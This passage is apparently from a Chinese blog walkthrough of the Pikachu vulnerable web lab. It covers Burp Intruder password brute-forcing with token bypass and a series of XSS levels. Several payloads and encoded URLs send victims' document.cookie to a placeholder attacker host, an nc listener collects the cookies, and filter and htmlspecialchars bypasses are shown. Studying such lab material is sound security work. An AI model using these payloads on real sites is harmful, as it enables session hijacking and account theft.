class="line-number">33</span><br></div></div><p>提交正确的验证码发到Repeater，随意修改验证码字段，Response也未提示验证码错误，说明该字段虽然也提交，但是服务端没有对其进行逻辑处理，接着还是老一套Intruder</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu7.png" alt="pikachu7"></p> <p>爆破成功，账号为：admin，密码为：123456</p> <h2 id="token防爆破"><a href="#token防爆破" class="header-anchor">#</a> token防爆破</h2> <p>随便提交一次，抓到的数据包内发现包含token字段，并且每次提交token值都在变化，重放次数过多会提示错误，并且该token就在网页表单中</p> <p>这就比较简单了，还是Intruder，给token字段也设为变量，在option中设置正则提取其内容</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu8.png" alt="pikachu8"></p> <p>对应的payload也设置为该正则</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu9.png" alt="pikachu9"></p> <p>开始爆破</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu10.png" alt="pikachu10"></p> <p>爆破成功，账号为：admin，密码为：123456</p> <h1 id="cross-site-scripting"><a href="#cross-site-scripting" class="header-anchor">#</a> Cross-Site Scripting</h1> <h2 id="反射型xss-get"><a href="#反射型xss-get" class="header-anchor">#</a> 反射型XSS(get)</h2> <p><code>&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</code>简单弹个hello看下</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu11.png" alt="pikachu11"></p> <p>可以看到内容被插入到页面了</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu12.png" alt="pikachu12"></p> <p>删除get的message字段，刷新后hello消失，反射型xss</p> <p>接下来构造的XSS的payload如下：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://ip:port/cookie=&quot;</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>经过编码后的链接如下</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://ip/vul/xss/xss_reflected_get.php?message=%3Cscript%3Enew+Image%28%29.src%3D%22http%3A%2F%2Fip%3Aport%2Fcookie%3D%22%2BencodeURI%28document.cookie%29%3B%3C%2Fscript%3E&amp;submit=submit#
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>vps开启监听</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">9999</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>模拟访问该链接</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu13.png" alt="pikachu13"></p> <p>获取cookie成功</p> <h2 id="反射型xss-post"><a href="#反射型xss-post" class="header-anchor">#</a> 反射型XSS(post)</h2> <p>也是<code>&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</code>简单弹个hello看下</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu14.png" alt="pikachu14"></p> <p>url无变化，post传参，用hackbar更清楚，删除message字段，刷新后hello消失，反射型xss</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu15.png" alt="pikachu15"></p> <p>反射post型不方便直接构造链接进行攻击，这里手动将下面的payload输入进去</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://ip:port/cookie=&quot;</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu16.png" alt="pikachu16"></p> <p>还是获得了cookie，看着有点乱，对应url解一下码即可</p> <h2 id="存储型xss"><a href="#存储型xss" class="header-anchor">#</a> 存储型XSS</h2> <p>就不弹窗了，直接开冲</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://ip:port/cookie=&quot;</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>很快啊，cookie就收到了</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu17.png" alt="pikachu17"></p> <p>刷新页面，也还是能收到cookie，存储型xss</p> <h2 id="dom型xss"><a href="#dom型xss" class="header-anchor">#</a> DOM型XSS</h2> <p>随便输入个1</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu18.png" alt="pikachu18"></p> <p>出现在了dom树中，dom型xss，尝试构造恶意dom</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>' onclick=&quot;new Image().src='http://ip:port/?cookie='+encodeURI(document.cookie);&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>恶意dom拆入后新dom树如下</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu19.png" alt="pikachu19"></p> <p>照例vps开启nc监听，客户端点击后vps收到cookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu20.png" alt="pikachu20"></p> <h2 id="dom型xss-x"><a href="#dom型xss-x" class="header-anchor">#</a> DOM型XSS-X</h2> <p>随便输入个flag，出现在了dom中，并且url内参数也发生了变化，类型get反射型xss</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu21.png" alt="pikachu21"></p> <p>思路一样还是闭合标签，构造恶意dom</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>' onclick=&quot;new Image().src='http://ip:port/?cookie='.concat(encodeURI(document.cookie));&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这里连接字符串不能用<code>+</code>号了，<code>+</code>号经url编码后失去了连接符的作用，所以用concat函数替换</p> <p>同时此种恶意链接经url编码后如下</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://ip/vul/xss/xss_dom_x.php?text=%27+onclick%3D%22new+Image%28%29.src%3D%27http%3A%2F%2Fip%3Aport%2F%3Fcookie%3D%27.concat%28encodeURI%28document.cookie%29%29%3B%22%3E#
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu22.png" alt="pikachu22"></p> <p>点击标签中内容，vps即可收到cookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu23.png" alt="pikachu23"></p> <h2 id="xss之盲打"><a href="#xss之盲打" class="header-anchor">#</a> XSS之盲打</h2> <p>直接两个输入框都输入下放payload，开冲</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">&quot;http://ip:port/cookie=&quot;</span><span class="token operator">+</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu24.png" alt="pikachu24"></p> <p>模拟登录管理员后台查看后，vps收到管理员cookie</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu25.png" alt="pikachu25"></p> <h2 id="xss的过滤"><a href="#xss的过滤" class="header-anchor">#</a> XSS的过滤</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu27.png" alt="pikachu27"></p> <p>后面还是弹窗吧，累了，懒得切来切去了</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>输入后没反应，查看页面发现只剩一个<code>&gt;</code>，不知道具体过滤了啥，无脑先试大小写绕过</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sCriPt</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sCriPt</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu26.png" alt="pikachu26"></p> <p>成功绕过，收获cookie一枚</p> <h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="header-anchor">#</a> XSS之htmlspecialchars</h2> <h3 id="htmlspecialchars函数"><a href="#htmlspecialchars函数" class="header-anchor">#</a> htmlspecialchars函数</h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$string</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name">ENT_COMPAT</span> <span class="token operator">|</span> <span class="token class-name">ENT_HTML401</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">string</span> <span class="token variable">$encoding</span> <span class="token operator">=</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;default_charset&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token keyword type-hint">bool</span> <span class="token variable">$double_encode</span> <span class="token operator">=</span> <span class="token constant boolean">true</span>
<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>该函数把预定义的字符转换为 HTML 实体</p> <table><thead><tr><th style="text-align:left;">预定义的字符</th> <th style="text-align:left;">转换后</th></tr></thead> <tbody><tr><td style="text-align:left;"><code>&amp;</code> (&amp; 符号)</td> <td style="text-align:left;"><code>&amp;amp;</code></td></tr> <tr><td style="text-align:left;"><code>&quot;</code> (双引号)</td> <td style="text-align:left;"><code>&amp;quot;</code>，除非设置了 <strong><code>ENT_NOQUOTES</code></strong></td></tr> <tr><td style="text-align:left;"><code>'</code> (单引号)</td> <td style="text-align:left;">设置了 <strong><code>ENT_QUOTES</code></strong> 后， <code>&amp;#039;</code> (如果是 <strong><code>ENT_HTML401</code></strong>) ，或者 <code>&amp;apos;</code> (如果是 <strong><code>ENT_XML1</code></strong>、 <strong><code>ENT_XHTML</code></strong> 或 <strong><code>ENT_HTML5</code></strong>)</td></tr> <tr><td style="text-align:left;"><code>&lt;</code> (小于)</td> <td style="text-align:left;"><code>&amp;lt;</code></td></tr> <tr><td style="text-align:left;"><code>&gt;</code> (大于)</td> <td style="text-align:left;"><code>&amp;gt;</code></td></tr></tbody></table> <p>参数：flag(位掩码，由以下某个或多个标记组成，设置转义处理细节、无效单元序列、文档类型。 默认是 <code>ENT_COMPAT | ENT_HTML401</code>)</p> <table><thead><tr><th><strong>常量名称</strong></th> <th><strong>描述</strong></th></tr></thead> <tbody><tr><td><strong><code>ENT_COMPAT</code></strong></td> <td>会转换双引号，不转换单引号。</td></tr> <tr><td><strong><code>ENT_QUOTES</code></strong></td> <td>既转换双引号也转换单引号。</td></tr> <tr><td><strong><code>ENT_NOQUOTES</code></strong></td> <td>单/双引号都不转换。</td></tr> <tr><td><strong><code>ENT_IGNORE</code></strong></td> <td>静默丢弃无效的代码单元序列，而不是返回空字符串。 不建议使用此标记， 因为它<a href="http://unicode.org/reports/tr36/#Deletion_of_Noncharacters" target="_blank" rel="noopener noreferrer">» 可能有安全影响<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>。</td></tr> <tr><td><strong><code>ENT_SUBSTITUTE</code></strong></td> <td>替换无效的代码单元序列为 Unicode 代替符（Replacement Character）， U+FFFD (UTF-8) 或者 <code>&amp;#xFFFD;</code> (其他)，而不是返回空字符串。</td></tr> <tr><td><strong><code>ENT_DISALLOWED</code></strong></td> <td>为文档的无效代码点替换为 Unicode 代替符（Replacement Character）： U+FFFD (UTF-8)，或 <code>&amp;#xFFFD;</code>（其他），而不是把它们留在原处。 比如以下情况下就很有用：要保证 XML 文档嵌入额外内容时格式合法。</td></tr> <tr><td><strong><code>ENT_HTML401</code></strong></td> <td>以 HTML 4.01 处理代码。</td></tr> <tr><td><strong><code>ENT_XML1</code></strong></td> <td>以 XML 1 处理代码。</td></tr> <tr><td><strong><code>ENT_XHTML</code></strong></td> <td>以 XHTML 处理代码。</td></tr> <tr><td><strong><code>ENT_HTML5</code></strong></td> <td>以 HTML 5 处理代码。</td></tr></tbody></table> <p>前置知识结束，直接将这些预定义字符一(<code>'&quot;&amp;&gt;&lt;</code>)起输入看看，结果如下</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_main<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>人生之所有苦短,是因为你的xss学习的还不够好<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_in<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>message<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>notice<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>你的输入已经被记录:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span> <span class="token attr-name">&amp;quot;&amp;amp;&amp;gt;&amp;lt;'</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>'&quot;<span class="token entity named-entity" title="&amp;">&amp;amp;</span><span class="token entity named-entity" title="&gt;">&amp;gt;</span><span class="token entity named-entity" title="&lt;">&amp;lt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>            
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>输入插入到了dom中，且只有<code>'</code>(单引号)没被转换，利用这点闭合属性，构造恶意payload如下</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>#' onclick='alert(document.cookie)'
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>恶意payload输入提交后新的页面核心部分如下</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_main<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>人生之所有苦短,是因为你的xss学习的还不够好<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_in<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>message<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>notice<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>你的输入已经被记录:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>#<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span> <span class="token attr-name">'</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>#' onclick='alert(document.cookie)'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>            
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu28.png" alt="pikachu28"></p> <p>点击标签弹出cookie</p> <h2 id="xss之href输出"><a href="#xss之href输出" class="header-anchor">#</a> xss之href输出</h2> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/pikachu29.png" alt="pikachu29"></p> <p>要求输入url，随意输入127.0.0.1后dom如下</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_main<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>请输入一个你常用的网站url地址,我就知道你是什么人<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_in<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>message<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>127.0.0.1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span> 阁下自己输入的url还请自己点一下吧<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>内容插入了a标签的href属性中，该处也可以执行js代码，构造恶意payload如下</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>Javascript:alert(document.cookie)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>提交后，核心dom变化如下</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_main<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>xssr_title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>请输入一个你常用的网站url地址,我就知道你是什么人<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>get<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
